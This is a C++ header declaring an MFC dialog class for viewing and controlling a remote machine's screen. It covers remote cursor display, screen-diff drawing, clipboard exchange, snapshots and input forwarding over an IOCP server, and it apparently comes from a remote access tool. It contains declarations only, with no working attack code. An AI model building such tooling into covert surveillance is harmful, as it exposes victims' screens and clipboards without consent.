#pragma once
#include"../../common/CursorInfo.h"
#include"IOCPServer.h"

// COLDSCREENSPY 对话框

class COLDSCREENSPY : public CDialog
{
	DECLARE_DYNAMIC(COLDSCREENSPY)

public:
	COLDSCREENSPY(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext* pContext = NULL);   // 标准构造函数
	virtual ~COLDSCREENSPY();
	void OnReceiveComplete();
	void OnReceive();
// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_OLDSCREENSPY };
#endif
public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持
	virtual void PostNcDestroy();
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	DECLARE_MESSAGE_MAP()
private:
	HICON m_hIcon;
	void InitMMI();
	MINMAXINFO m_MMI;
	void DrawTipString(CString str);
	HDC m_hDC, m_hMemDC, m_hPaintDC;
	HBITMAP	m_hFullBitmap;
	LPVOID m_lpScreenDIB;
	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;
	UINT m_HScrollPos, m_VScrollPos;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	void ResetScreen();
	void DrawFirstScreen();
	void DrawNextScreenDiff();	
	void DrawNextScreenRect();	
	void SendResetScreen(int nBitCount);
	void SendResetAlgorithm(UINT nAlgorithm);
	bool SaveSnapshot();
	void UpdateLocalClipboard(char* buf, int len);
	void SendLocalClipboard();
	int	m_nBitCount;
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsCtrl;
	void SendNext();
	void SendCommand(MSG* pMsg);
	LRESULT OnGetMiniMaxInfo(WPARAM, LPARAM);
};
